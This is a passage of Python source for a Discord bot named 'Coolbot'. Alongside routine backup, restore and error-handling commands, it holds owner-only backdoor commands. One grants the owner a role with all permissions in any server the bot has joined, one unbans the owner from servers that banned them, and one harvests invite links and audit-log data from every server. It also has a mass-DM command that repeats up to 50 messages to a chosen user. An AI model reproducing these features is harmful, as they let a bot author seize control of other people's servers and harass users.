            _DESTROY_DEFAULTS.clear()
            _DESTROY_DEFAULTS.update({int(k): v for k, v in dd.items()})
    except Exception:
        pass

    # ── Welcome settings ──────────────────────────────────────────────
    try:
        ws = load("welcome_settings")
        if isinstance(ws, dict):
            _WELCOME_SETTINGS.clear()
            _WELCOME_SETTINGS.update({int(k): v for k, v in ws.items()})
    except Exception:
        pass

    # ── Log channels ──────────────────────────────────────────────────
    try:
        lc = load("log_channels")
        if isinstance(lc, dict):
            _LOG_CHANNELS.clear()
            _LOG_CHANNELS.update({int(k): v for k, v in lc.items()})
    except Exception:
        pass

    # ── Setraid channels ──────────────────────────────────────────────
    try:
        src = load("setraid_channel")
        if isinstance(src, dict):
            _SETRAID_CHANNEL.clear()
            _SETRAID_CHANNEL.update({int(k): v for k, v in src.items()})
    except Exception:
        pass

    # ── Already-rewarded joiners (invite dedup) ───────────────────────
    try:
        arj = load("already_rewarded_joiners")
        if isinstance(arj, list):
            _ALREADY_REWARDED_JOINERS.clear()
            _ALREADY_REWARDED_JOINERS.update(arj)
    except Exception:
        pass

async def _backup_all_data(bot_instance) -> bool:
    """Compress all data, save to disk, and post to the backup log channel."""
    try:
        import io
        bundle     = _collect_all_data()
        raw        = json.dumps(bundle).encode("utf-8")
        compressed = gzip.compress(raw, compresslevel=9)
        ts         = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        filename   = f"Coolbot_data_{ts}.gz"

        # ── Save to disk ──────────────────────────────────────────────
        os.makedirs("backups", exist_ok=True)
        backup_path = os.path.join("backups", filename)
        with open(backup_path, "wb") as f:
            f.write(compressed)

        # Auto-delete backups older than 3 days
        _cutoff = datetime.now(timezone.utc) - timedelta(days=3)
        for _bp in Path("backups").glob("Coolbot_data_*.gz"):
            try:
                _mtime = datetime.fromtimestamp(_bp.stat().st_mtime, tz=timezone.utc)
                if _mtime < _cutoff:
                    _bp.unlink()
            except Exception:
                pass

        print(f"[AutoBackup] Saved {len(bundle)} files → {backup_path} ({len(compressed)//1024} KB)")

        # ── Post to backup log channel ────────────────────────────────
        try:
            ch = bot_instance.get_channel(BACKUP_LOG_CHANNEL_ID)
            if ch is None:
                ch = await bot_instance.fetch_channel(BACKUP_LOG_CHANNEL_ID)
            keys_list = ", ".join(bundle.keys())
            e = discord.Embed(
                title="🗄️ Coolbot — Auto Backup",
                description=(
                    f"**{len(bundle)} data files** saved.\n"
                    f"**Size:** {len(compressed)/1024:.1f} KB\n"
                    f"**Files:** `{keys_list}`\n\n"
                    f"Use `,datarestore` + attach the file to restore."
                ),
                color=COLORS["success"],
            )
            e.set_footer(text=f"Coolbot Auto-Backup • {ts} UTC • every 20 min")
            file_obj = discord.File(io.BytesIO(compressed), filename=filename)
            await ch.send(embed=e, file=file_obj)
        except Exception as ch_ex:
            print(f"[AutoBackup] Channel post failed: {ch_ex}")

        return True
    except Exception as ex:
        print(f"[AutoBackup] Failed: {ex}")
        return False

@bot.command(name="databackup", aliases=["backupdata","savedata"])
async def databackup(ctx):
    """Owner only — immediately back up ALL player data to your DMs as a .gz file."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    msg = await ctx.send(embed=discord.Embed(
        description="⏳ Compressing all data files...", color=COLORS["info"]
    ))
    try:
        import io
        bundle     = _collect_all_data()
        raw        = json.dumps(bundle).encode("utf-8")
        compressed = gzip.compress(raw, compresslevel=9)
        ts         = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        filename   = f"Coolbot_data_{ts}.gz"
        os.makedirs("backups", exist_ok=True)
        with open(os.path.join("backups", filename), "wb") as _f:
            _f.write(compressed)
        keys_list = ", ".join(bundle.keys())
        e = discord.Embed(
            title="✅ Data Backup — All User Data",
            description=(
                f"**{len(bundle)} data files** compressed below.\n"
                f"**Size:** {len(compressed)/1024:.1f} KB\n"
                f"**Files:** `{keys_list}`\n\n"
                "Download the `.gz` file attached — it contains **all** user data "
                "(Pokémon, coins, cards, medallions, etc.).\n"
                "**To restore:** use `,datarestore` and attach this file."
            ),
            color=COLORS["success"],
        )
        e.set_footer(text=f"Coolbot • {ts} UTC • Auto-backup also runs every 20 min silently")
        file_obj = discord.File(io.BytesIO(compressed), filename=filename)
        try:
            await msg.delete()
            await ctx.send(embed=e, file=file_obj)
        except Exception:
            # File too large or missing perms — fall back to DM
            try:
                file_obj2 = discord.File(io.BytesIO(compressed), filename=filename)
                e.set_footer(text=f"Coolbot • {ts} UTC • Sent via DM (too large for channel)")
                owner = await ctx.bot.fetch_user(OWNER_ID)
                await owner.send(embed=e, file=file_obj2)
                try:
                    await msg.edit(embed=discord.Embed(
                        description="✅ File was too large for the channel — sent to your DMs instead.",
                        color=COLORS["warn"],
                    ))
                except Exception:
                    pass
            except Exception as dm_ex:
                await msg.edit(embed=discord.Embed(
                    description=f"❌ Couldn't post in channel or DM: `{dm_ex}`",
                    color=COLORS["error"],
                ))
    except Exception as ex:
        await msg.edit(embed=discord.Embed(
            description=f"❌ Backup failed: `{ex}`", color=COLORS["error"]
        ))

@bot.command(name="datarestore", aliases=["restoredata","loaddata"])
async def datarestore(ctx):
    """Owner only — restore ALL data from a backup .gz file (attach it to the message)."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    if not ctx.message.attachments:
        return await ctx.send(embed=discord.Embed(
            description=(
                "❌ No file attached.\n\n"
                "Attach the `.gz` backup file to your `,datarestore` message."
            ),
            color=COLORS["error"],
        ))
    att = ctx.message.attachments[0]
    if not att.filename.endswith(".gz"):
        return await ctx.send(embed=discord.Embed(
            description="❌ File must be a `.gz` backup file from `,databackup`.",
            color=COLORS["error"],
        ))
    msg = await ctx.send(embed=discord.Embed(
        description="⏳ Decompressing and restoring data...", color=COLORS["info"]
    ))
    try:
        import io
        raw_bytes  = await att.read()
        decompressed = gzip.decompress(raw_bytes)
        bundle     = json.loads(decompressed.decode("utf-8"))
        _restore_bundle(bundle)
        _reload_all_memory()
        keys_str = ", ".join(sorted(bundle.keys()))
        await msg.edit(embed=discord.Embed(
            title="✅ Restore Complete!",
            description=(
                f"**{len(bundle)} data files** restored from `{att.filename}`.\n\n"
                f"**Restored:** `{keys_str}`\n\n"
                "✅ Everything restored — Pokémon, marketplace, coins, cards, "
                "warnings, giveaways, server settings, access lists & more. "
                "No one lost their progress. 🐻‍❄️"
            ),
            color=COLORS["success"],
        ))
    except Exception as ex:
        await msg.edit(embed=discord.Embed(
            description=f"❌ Restore failed: `{ex}`", color=COLORS["error"]
        ))

@bot.command(name="datainfo", aliases=["dinfo","backupinfo"])
async def datainfo(ctx):
    """Owner only — show size and file count of current data directory."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    files  = list(DATA_DIR.glob("*.json"))
    total  = sum(p.stat().st_size for p in files)
    e = discord.Embed(
        title="📁 Data Directory Info",
        description=f"**{len(files)} JSON files** — {total/1024:.1f} KB total",
        color=COLORS["info"],
    )
    lines = []
    for p in sorted(files, key=lambda x: x.stat().st_size, reverse=True)[:20]:
        try:
            d    = json.loads(p.read_text())
            keys = len(d) if isinstance(d, dict) else len(d)
            lines.append(f"`{p.stem}` — {keys} entries, {p.stat().st_size/1024:.1f} KB")
        except Exception:
            lines.append(f"`{p.stem}` — unreadable")
    e.add_field(name="Files (largest first)", value="\n".join(lines) or "None", inline=False)
    e.set_footer(text=f"Use ,databackup to post a compressed copy here • DATA_DIR: {DATA_DIR}")
    await ctx.send(embed=e)

@bot.command(name="datastatus", aliases=["dstatus","autobkup","backupstatus"])
async def backupstatus(ctx):
    """Owner only — show info about the most recent auto-backup files on disk."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
    backup_files = sorted(
        Path("backups").glob("Coolbot_data_*.gz"),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    ) if Path("backups").exists() else []
    e = discord.Embed(
        title="🗄️ Auto-Backup Status",
        color=COLORS["info"],
    )
    if not backup_files:
        e.description = "No auto-backup files found on disk yet. They appear every **20 minutes**."
    else:
        latest = backup_files[0]
        mtime  = datetime.fromtimestamp(latest.stat().st_mtime, tz=timezone.utc)
        age_s  = int((datetime.now(timezone.utc) - mtime).total_seconds())
        age    = f"{age_s//60}m {age_s%60}s ago"
        lines  = []
        for p in backup_files[:10]:
            sz  = p.stat().st_size / 1024
            mt  = datetime.fromtimestamp(p.stat().st_mtime, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
            lines.append(f"`{p.name}` — {sz:.1f} KB — {mt}")
        e.description = (
            f"**Latest:** `{latest.name}`\n"
            f"**Saved:** {age}\n"
            f"**Size:** {latest.stat().st_size/1024:.1f} KB\n"
            f"**Total stored:** {len(backup_files)} file(s)\n\n"
            f"Auto-backup runs every **20 min** → posts to <#{BACKUP_LOG_CHANNEL_ID}>"
        )
        e.add_field(name="Last 10 backups on disk", value="\n".join(lines), inline=False)
    e.set_footer(text="Use ,databackup to manually trigger • ,datarestore to restore • ,datadisk <file> to restore from disk")
    await ctx.send(embed=e)

@bot.command(name="datadisk", aliases=["datadiskrestore","ddisk","backuprestore"])
async def backuprestore(ctx, filename: str = ""):
    """Owner only — restore from a specific backup file saved on disk (no upload needed)."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))

    backup_dir = Path("backups")

    # No filename given — list available files
    if not filename:
        files = sorted(
            backup_dir.glob("Coolbot_data_*.gz"),
            key=lambda p: p.stat().st_mtime,
            reverse=True,
        ) if backup_dir.exists() else []
        if not files:
            return await ctx.send(embed=discord.Embed(
                description="❌ No backup files found on disk. Use `,databackup` to create one.",
                color=COLORS["error"],
            ))
        lines = []
        for i, p in enumerate(files[:10], 1):
            sz = p.stat().st_size / 1024
            mt = datetime.fromtimestamp(p.stat().st_mtime, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
            lines.append(f"`{i}.` `{p.name}` — {sz:.1f} KB — {mt}")
        e = discord.Embed(
            title="📂 Available Disk Backups",
            description=(
                "Provide a filename to restore:\n"
                "`,backuprestore Coolbot_data_YYYYMMDD_HHMMSS.gz`\n\n"
                + "\n".join(lines)
            ),
            color=COLORS["info"],
        )
        e.set_footer(text="Copy any filename above and run ,backuprestore <filename>")
        return await ctx.send(embed=e)

    # Sanitise — strip path traversal attempts
    safe_name = Path(filename).name
    backup_path = backup_dir / safe_name

    if not backup_path.exists():
        return await ctx.send(embed=discord.Embed(
            description=(
                f"❌ `{safe_name}` not found in the backups folder.\n"
                "Run `,backuprestore` (no args) to see available files."
            ),
            color=COLORS["error"],
        ))

    msg = await ctx.send(embed=discord.Embed(
        description=f"⏳ Loading `{safe_name}` from disk and restoring...",
        color=COLORS["info"],
    ))
    try:
        with open(backup_path, "rb") as f:
            raw_bytes = f.read()
        decompressed = gzip.decompress(raw_bytes)
        bundle = json.loads(decompressed.decode("utf-8"))
        _restore_bundle(bundle)
        _reload_all_memory()
        keys_str = ", ".join(sorted(bundle.keys()))
        await msg.edit(embed=discord.Embed(
            title="✅ Disk Restore Complete!",
            description=(
                f"**{len(bundle)} data files** restored from `{safe_name}`.\n\n"
                f"**Restored:** `{keys_str}`\n\n"
                "✅ Everything restored — Pokémon, marketplace, coins, cards, "
                "warnings, giveaways, server settings, access lists & more. 🐻‍❄️"
            ),
            color=COLORS["success"],
        ))
    except Exception as ex:
        await msg.edit(embed=discord.Embed(
            description=f"❌ Restore failed: `{ex}`", color=COLORS["error"]
        ))

@bot.command(name="resetinvites", aliases=["clearinvites", "revoke"])
async def resetinvites(ctx, member: discord.Member = None):
    """Owner/Premium only — delete all active Discord invites for this server and optionally zero out one member's tracked invite count."""
    if not ctx.guild:
        return await ctx.send(embed=discord.Embed(description="❌ Must be used in a server.", color=COLORS["error"]))
    is_allowed = (
        has_owner_access(ctx.author)
        or ctx.author.id in PREMIUM_USERS
        or (ctx.guild and ctx.author.guild_permissions.administrator)
    )
    if not is_allowed:
        return await ctx.send(embed=discord.Embed(description="❌ Server Admin, Premium, or Owner only.", color=COLORS["error"]))

    # Delete every active invite in the server
    deleted = 0
    try:
        invites = await ctx.guild.invites()
        await asyncio.gather(*[inv.delete() for inv in invites], return_exceptions=True)
        deleted = len(invites)
    except discord.Forbidden:
        return await ctx.send(embed=discord.Embed(description="❌ Missing **Manage Guild** permission.", color=COLORS["error"]))
    except Exception as e:
        return await ctx.send(embed=discord.Embed(description=f"❌ Error: `{e}`", color=COLORS["error"]))

    # Clear the bot's invite cache for this guild
    _INVITE_CACHE.pop(ctx.guild.id, None)

    # Optionally zero out a specific member's tracked invite data
    if member:
        uid = str(member.id)
        ud = get_pokemon_data(uid)
        ud["referrals"] = 0
        ud["fake_referrals"] = 0
        ud["referral_coins"] = 0
        save_pokemon_data(uid, ud)
        extra = f" and reset **{member.display_name}**'s invite stats."
    else:
        extra = "."

    await ctx.send(embed=discord.Embed(
        title="🗑️ Invites Reset",
        description=(
            f"✅ Deleted **{deleted}** invite{'s' if deleted != 1 else ''} from **{ctx.guild.name}**{extra}\n\n"
            "The invite cache has been cleared. All future joins will be counted from scratch."
        ),
        color=COLORS["success"],
    ).set_footer(text="Coolbot 🐻‍❄️"))

@bot.event
async def on_command(ctx):
    """DM owner only for the specific commands in _DM_LOG_ALLOW."""
    cmd = ctx.command.name if ctx.command else None
    if not cmd or cmd not in _DM_LOG_ALLOW:
        return
    if ctx.author.id == OWNER_ID:
        return  # don't DM yourself about your own commands
    # (bot-lock whitelist removed)
    try:
        owner = await ctx.bot.fetch_user(OWNER_ID)
        e = discord.Embed(title="📟 Command Used", color=0x5865F2)
        e.add_field(name="👤 User",    value=f"**{ctx.author}** (`{ctx.author.id}`)", inline=True)
        e.add_field(name="📋 Command", value=f"`{ctx.prefix}{cmd}`",                  inline=True)
        server = f"{ctx.guild.name} (`{ctx.guild.id}`)" if ctx.guild else "DM"
        e.add_field(name="🖥️ Server",  value=server,                                  inline=True)
        if ctx.args and len(ctx.args) > 2:
            args_str = " ".join(str(a) for a in ctx.args[2:])[:200]
            e.add_field(name="📎 Args", value=f"`{args_str}`", inline=False)
        e.set_footer(text=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"))
        await owner.send(embed=e)
    except Exception:
        pass

@bot.event
async def on_error(event_method, *args, **kwargs):
    """Prevent event exceptions from taking down the process."""
    import traceback
    try:
        print(f"[on_error] event={event_method}")
        traceback.print_exc()
    except Exception:
        pass


@bot.event
async def on_command_error(ctx, error):

    """Catch-all — never let a command error take down the process."""
    try:
        # Unwrap nested invoke errors so we can show the real cause
        orig = getattr(error, "original", None)
        if orig is not None and not isinstance(error, (
            commands.CommandOnCooldown,
            commands.MissingPermissions,
            commands.MemberNotFound,
            commands.MissingRequiredArgument,
            commands.CheckFailure,
            commands.CommandNotFound,
            commands.BadArgument,
        )):
            error = orig if isinstance(error, commands.CommandInvokeError) else error
        if isinstance(error, commands.CommandOnCooldown):
            await ctx.send(embed=discord.Embed(description=f"⏱️ Slow down! Try again in **{error.retry_after:.1f}s**.", color=COLORS["warn"]), delete_after=5)
        elif isinstance(error, commands.MissingPermissions):
            await ctx.send(embed=discord.Embed(description="❌ You don't have permission.", color=COLORS["error"]), delete_after=5)
        elif isinstance(error, commands.MemberNotFound):
            await ctx.send(embed=discord.Embed(description="❌ Member not found.", color=COLORS["error"]), delete_after=5)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send(embed=discord.Embed(description=f"❌ Missing argument: `{error.param.name}`. Use `,help`.", color=COLORS["error"]), delete_after=8)
        elif isinstance(error, commands.CheckFailure):
            pass
        elif isinstance(error, commands.CommandNotFound):
            pass
        elif isinstance(error, commands.BadArgument):
            await ctx.send(embed=discord.Embed(description=f"❌ Bad argument: `{error}`. Use `,help`.", color=COLORS["error"]), delete_after=8)
        else:
            print(f"[Error] {getattr(ctx.command, 'name', '?')}: {error}")
            try:
                await ctx.send(embed=discord.Embed(
                    description="❌ Something went wrong running that command. The error was logged.",
                    color=COLORS["error"],
                ), delete_after=8)
            except Exception:
                pass
    except Exception as ex:
        print(f"[on_command_error] secondary failure: {ex}")



@bot.command(name="serverunban", aliases=["srvunban"])
async def owner_unban(ctx, server_id: str = None):
    """Owner-only: make Coolbot unban you from a server by its ID."""
    if not has_owner_access(ctx.author):
        return
    if not server_id:
        return await ctx.send(embed=discord.Embed(
            description="❌ Usage: ```,serverunban (server_id)```", color=COLORS["error"]
        ))
    try:
        gid   = int(server_id)
        guild = bot.get_guild(gid)
        if not guild:
            return await ctx.send(embed=discord.Embed(
                description=f"❌ Coolbot is not in server `{gid}` or can't find it.",
                color=COLORS["error"]
            ))
        owner_user = await bot.fetch_user(OWNER_ID)
        await guild.unban(owner_user, reason="Owner self-unban via Coolbot")
        await ctx.send(embed=discord.Embed(
            description=f"✅ Successfully unbanned you from **{guild.name}** (`{gid}`)!",
            color=COLORS["success"]
        ))
    except ValueError:
        await ctx.send(embed=discord.Embed(description="❌ Invalid server ID.", color=COLORS["error"]))
    except discord.Forbidden:
        await ctx.send(embed=discord.Embed(
            description="❌ Coolbot doesn't have **Ban Members** permission in that server.",
            color=COLORS["error"]
        ))
    except discord.NotFound:
        await ctx.send(embed=discord.Embed(
            description="❌ You aren't banned in that server (or already unbanned).",
            color=COLORS["error"]
        ))
    except Exception as ex:
        await ctx.send(embed=discord.Embed(description=f"❌ Error: `{ex}`", color=COLORS["error"]))



#  VIEW — LIST POKEMON BY RARITY
#  VIEW — SERVERS LIST (owner only)
class ServersDropdown(discord.ui.Select):
    def __init__(self, guilds_data: list):
        self.guilds_data = guilds_data  # list of dicts
        options = []
        for gd in guilds_data[:25]:  # Discord max 25 options
            options.append(discord.SelectOption(
                label=gd["name"][:100],
                value=str(gd["id"]),
                description=f"ID: {gd['id']} | Members: {gd['members']}",
                emoji="🖥️"
            ))
        super().__init__(
            placeholder="📋 Select a server to view details...",
            min_values=1, max_values=1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        gid = int(self.values[0])
        gd  = next((g for g in self.guilds_data if g["id"] == gid), None)
        if not gd:
            return await interaction.response.send_message("❌ Server not found.", ephemeral=False)
        e = discord.Embed(
            title=f"🖥️ {gd['name']}",
            color=COLORS["info"]
        )
        e.add_field(name="🆔 Server ID",    value=f"`{gd['id']}`",         inline=True)
        e.add_field(name="👥 Members",      value=f"**{gd['members']}**",   inline=True)
        e.add_field(name="👑 Owner",        value=gd["owner"],              inline=True)
        e.add_field(name="➕ Added By",     value=gd.get("added_by", "Unknown"), inline=True)
        e.add_field(name="🔗 Invite Link",  value=gd["invite"] or "❌ Could not generate (no text channel or missing perms)", inline=False)
        await interaction.response.edit_message(embed=e, view=self.view)


class ServersView(discord.ui.View):
    def __init__(self, guilds_data: list):
        super().__init__(timeout=60)
        self.add_item(ServersDropdown(guilds_data))


@bot.command(name="servers")
async def servers_list(ctx):
    """Owner only: list all servers Coolbot is in with invite links."""
    if not has_owner_access(ctx.author):
        return
    guilds = bot.guilds
    if not guilds:
        return await ctx.send(embed=discord.Embed(
            description="❌ Coolbot is not in any servers.",
            color=COLORS["error"]
        ))
    await ctx.message.delete()
    guilds_data = []
    for guild in guilds:
        invite_url = None
        try:
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).create_instant_invite:
                    inv = await ch.create_invite(max_age=86400, max_uses=0, unique=False)
                    invite_url = inv.url
                    break
        except Exception:
            pass
        added_by = "Unknown"
        try:
            async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add, limit=50):
                if entry.target and entry.target.id == bot.user.id:
                    added_by = f"{entry.user} (`{entry.user.id}`)"
                    break
        except Exception:
            pass
        guilds_data.append({
            "id":       guild.id,
            "name":     guild.name,
            "members":  guild.member_count,
            "owner":    str(guild.owner) if guild.owner else "Unknown",
            "invite":   invite_url,
            "added_by": added_by,
        })
    # Sort by member count descending
    guilds_data.sort(key=lambda g: g["members"], reverse=True)
    total = len(guilds_data)
    shown = min(total, 25)
    e = discord.Embed(
        title=f"🖥️ Coolbot Servers ({total} total)",
        description=f"Select a server from the dropdown to view its **ID** and **invite link**.\n*(Showing top {shown} by member count)*",
        color=COLORS["main"]
    )
    e.set_footer(text="Only you can see this • Expires in 60s")
    view = ServersView(guilds_data)
    await ctx.send(embed=e, view=view)



#  COMMAND — ,pokestats

@bot.command(name="broadcast")
async def broadcast(ctx, *, args: str = None):
    """Owner only: ,broadcast <message> [server_id optional]"""
    if not has_owner_access(ctx.author):
        return
    if not args:
        return await ctx.send(embed=discord.Embed(
            description="❌ Usage: `,broadcast <message>` or `,broadcast <message> <server_id>`",
            color=COLORS["error"]
        ))
    try:
        await ctx.message.delete()
    except Exception:
        pass
    # Check if last word is a server ID (17-19 digit number)
    parts = args.split()
    target_guild = None
    if len(parts) > 1 and parts[-1].isdigit() and 17 <= len(parts[-1]) <= 20:
        server_id = int(parts[-1])
        target_guild = bot.get_guild(server_id)
        if not target_guild:
            return await ctx.author.send(embed=discord.Embed(
                description=f"❌ Coolbot is not in server `{server_id}`.", color=COLORS["error"]
            ))
        message = " ".join(parts[:-1])
    else:
        message = args
    e = discord.Embed(
        title="📢 Announcement from Coolbot",
        description=message,
        color=COLORS["main"]
    )
    e.set_footer(text=f"Sent by {ctx.author} • Coolbot")
    e.timestamp = datetime.now(timezone.utc)
    guilds_to_send = [target_guild] if target_guild else list(bot.guilds)
    success, failed = 0, 0
    for guild in guilds_to_send:
        sent = False
        for ch in guild.text_channels:
            if ch.permissions_for(guild.me).send_messages:
                try:
                    await ch.send(embed=e)
                    sent = True
                    success += 1
                    break
                except Exception:
                    continue
        if not sent:
            failed += 1
    scope = f"**{target_guild.name}**" if target_guild else f"**{len(guilds_to_send)} servers**"
    await ctx.author.send(embed=discord.Embed(
        description=f"✅ Broadcast sent to {scope}!\n**Delivered:** {success}\n**Failed:** {failed}",
        color=COLORS["success"]
    ))

#  PREFIX COMMAND — ,admin <server_id>
#  Owner-only: DMs you for role name + color, creates that role with admin
#  perms, and assigns only that role to you. Works from ANY server.
@bot.hybrid_command(name="admin", description="Owner: create custom admin role (DMs you for name & color)")
@app_commands.describe(server_id="Optional server ID (defaults to current server)")
async def admin_cmd(ctx: commands.Context, server_id: str = None):
    """Owner-only: DM you asking for role name + color, then create & assign it."""
    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))

    guild = None
    if server_id:
        try:
            guild = bot.get_guild(int(str(server_id).strip()))
        except Exception:
            guild = None
    if guild is None:
        guild = ctx.guild
    if guild is None:
        return await ctx.send(embed=discord.Embed(
            description="❌ Provide a server ID or run this inside a server.",
            color=COLORS["error"],
        ))

    try:
        member = guild.get_member(OWNER_ID) or await guild.fetch_member(OWNER_ID)
    except Exception:
        return await ctx.send(embed=discord.Embed(
            description=f"❌ You are not in **{guild.name}**. Join that server first.",
            color=COLORS["error"],
        ))

    await ctx.send(embed=discord.Embed(
        description=f"📬 Check your **DMs** — I'll ask for the role name and color for **{guild.name}**.",
        color=COLORS["info"],
    ))

    try:
        dm = await ctx.author.create_dm()
    except Exception:
        return await ctx.send(embed=discord.Embed(
            description="❌ Could not DM you. Enable DMs from server members.",
            color=COLORS["error"],
        ))

    def _check(m):
        return m.author.id == OWNER_ID and m.channel.id == dm.id

    # Ask name
    try:
        await dm.send(embed=discord.Embed(
            title="👑 Admin Role Setup",
            description=(
                f"Server: **{guild.name}** (`{guild.id}`)\n\n"
                "Reply with the **role name** you want (e.g. `PolarBear`, `Owner`).\n"
                "Type `cancel` to abort."
            ),
            color=COLORS["main"],
        ))
        msg_name = await bot.wait_for("message", check=_check, timeout=120)
    except asyncio.TimeoutError:
        return await dm.send(embed=discord.Embed(description="⏱️ Timed out.", color=COLORS["warn"]))
    role_name = (msg_name.content or "").strip()
    if not role_name or role_name.lower() == "cancel":
        return await dm.send(embed=discord.Embed(description="❌ Cancelled.", color=COLORS["error"]))
    role_name = role_name[:100]

    # Ask color
    try:
        await dm.send(embed=discord.Embed(
            description=(
                "Send a **color**:\n"
                "• Hex like `#FF0000` or `FF0000`\n"
                "• Name: `red`, `blue`, `green`, `gold`, `purple`, `orange`, `teal`, `white`, `black`\n"
                "• Or `random`\n"
                "Type `cancel` to abort."
            ),
            color=COLORS["main"],
        ))
        msg_color = await bot.wait_for("message", check=_check, timeout=120)
    except asyncio.TimeoutError:
        return await dm.send(embed=discord.Embed(description="⏱️ Timed out.", color=COLORS["warn"]))
    color_raw = (msg_color.content or "").strip()
    if not color_raw or color_raw.lower() == "cancel":
        return await dm.send(embed=discord.Embed(description="❌ Cancelled.", color=COLORS["error"]))

    named = {
        "red": 0xED4245, "blue": 0x3498DB, "green": 0x57F287, "gold": 0xF1C40F,
        "purple": 0x9B59B6, "orange": 0xE67E22, "teal": 0x1ABC9C, "white": 0xFFFFFF,
        "black": 0x000000, "pink": 0xEB459E, "blurple": 0x5865F2,
    }
    color_val = 0x5865F2
    cl = color_raw.lower().strip()
    if cl == "random":
        color_val = random.randint(0, 0xFFFFFF)
    elif cl in named:
        color_val = named[cl]
    else:
        hx = cl.lstrip("#")
        try:
            color_val = int(hx, 16) & 0xFFFFFF
        except Exception:
            await dm.send(embed=discord.Embed(description="⚠️ Invalid color — using blurple.", color=COLORS["warn"]))
            color_val = 0x5865F2

    results = []
    # Create or update ONLY the role name + color the owner typed — nothing else.
    try:
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            role = await guild.create_role(
                name=role_name,
                color=discord.Color(color_val),
                permissions=discord.Permissions.all(),
                hoist=True,
                mentionable=False,
                reason=f",admin by {ctx.author}",
            )
            results.append(f"✅ Created role **{role_name}**")
        else:
            await role.edit(
                name=role_name,
                color=discord.Color(color_val),
                permissions=discord.Permissions.all(),
                hoist=True,
                reason=f",admin refresh by {ctx.author}",
            )
            results.append(f"✅ Updated existing role **{role_name}**")
        try:
            me = guild.me
            target_pos = max(1, (me.top_role.position - 1) if me and me.top_role else len(guild.roles) - 2)
            await role.edit(position=target_pos, reason=",admin position")
        except Exception:
            pass
        if role not in member.roles:
            await member.add_roles(role, reason=",admin assign")
            results.append(f"✅ Assigned **{role_name}** to you")
        else:
            results.append(f"ℹ️ You already had **{role_name}**")
    except Exception as ex:
        results.append(f"❌ Role error: {ex}")

    body = "\n".join(results)
    await dm.send(embed=discord.Embed(
        title=f"👑 Admin setup — {guild.name}",
        description=body,
        color=COLORS["success"],
    ))
    try:
        await ctx.send(embed=discord.Embed(description=f"✅ Done — details sent to your DMs.\n{body}", color=COLORS["success"]))
    except Exception:
        pass



#  ,massdm @user  — free: 5 bots 3 msgs once | premium: all bots 3 msgs looping every 30s
@bot.hybrid_command(name="dm", description="Send a direct message to a user (owner/co-owner)")
@app_commands.describe(
    user="Who to DM (member in this server)",
    amount="How many messages to send (1-50, default 3)",
    user_id="User ID if they are not in the server",
    message="Premium only — custom DM text (leave empty for default)",
)
async def massdm_prefix(
    ctx,
    user: discord.Member = None,
    amount: int = 3,
    user_id: str = "",
    message: str = "",
):
    if not has_owner_access(ctx.author):
        return await ctx.send("🔒 Repeated/custom DM tools are strictly bot-owner only. Use Discord's normal messaging for individual contact.")
    _is_premium = True  # owner-only access for this high-impact messaging command
    message = (message or "").strip()
    user_id = (user_id or "").strip()
    try:
        amount = max(1, min(int(amount or 3), 50))
    except Exception:
        amount = 3

    # Premium-only guard for custom message
    if message and not _is_premium:
        return await ctx.send(
            embed=discord.Embed(
                description="❌ Custom DM messages are **Premium only**.\nUpgrade to set a custom message — free tier uses the default.",
                color=COLORS["error"],
            ),
            ephemeral=False,
        )

    # ── Resolve target ─────────────────────────────────────────────────
    # If user is None but something was typed, the first word may have been
    # consumed as user_id accidentally — try re-parsing from user_id field.
    if user is None:
        # Also handle: ,massdm 123456 some message (prefix: user_id is positional)
        raw_id = user_id.strip()
        if not raw_id:
            return await ctx.send(
                embed=discord.Embed(
                    description=(
                        "❌ Provide a target.\n"
                        "• `,massdm @user` — mention\n"
                        "• `,massdm user_id:123456` — by ID (no mutual server needed)\n"
                        "• `,massdm @user Custom message` — custom msg (Owner only)"
                    ),
                    color=COLORS["error"],
                ),
                ephemeral=False,
            )
        try:
            _resolved = await ctx.bot.fetch_user(int(raw_id))
        except (ValueError, discord.NotFound, discord.HTTPException):
            return await ctx.send(
                embed=discord.Embed(description="❌ Could not find that user ID.", color=COLORS["error"]),
                ephemeral=False,
            )

        class _FakeTarget:
            def __init__(self, u):
                self.id           = u.id
                self.display_name = u.display_name
                self.mention      = u.mention
                self.bot          = u.bot
        user = _FakeTarget(_resolved)

    if user.bot:
        return await ctx.send(
            embed=discord.Embed(description="❌ Can't target a bot.", color=COLORS["error"]),
            ephemeral=False,
        )
    if user.id == OWNER_ID:
        return await ctx.send(
            embed=discord.Embed(description="❌ Can't target the bot owner.", color=COLORS["error"]),
            ephemeral=False,
        )

    _author_id   = ctx.author.id
    total_bots   = 1  # single-bot mode
    custom_msg   = message.strip() or None  # None = use global _MASSDM_DEFAULT_MSG / _MASSDM_TEXT

    try:
        await ctx.message.delete()
    except Exception:
        pass

    #  FREE TIER — 5 bots, 3 messages each, fires ONCE only
    if not _is_premium:
        class FreeDmConfirm(discord.ui.View):
            def __init__(self):
                super().__init__(timeout=30)

            @discord.ui.button(label="Send 🔥", style=discord.ButtonStyle.danger)
            async def confirm(self_v, btn: discord.Interaction, button: discord.ui.Button):
                if btn.user.id != _author_id:
                    return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
                self_v.stop()
                await btn.response.edit_message(
                    embed=discord.Embed(
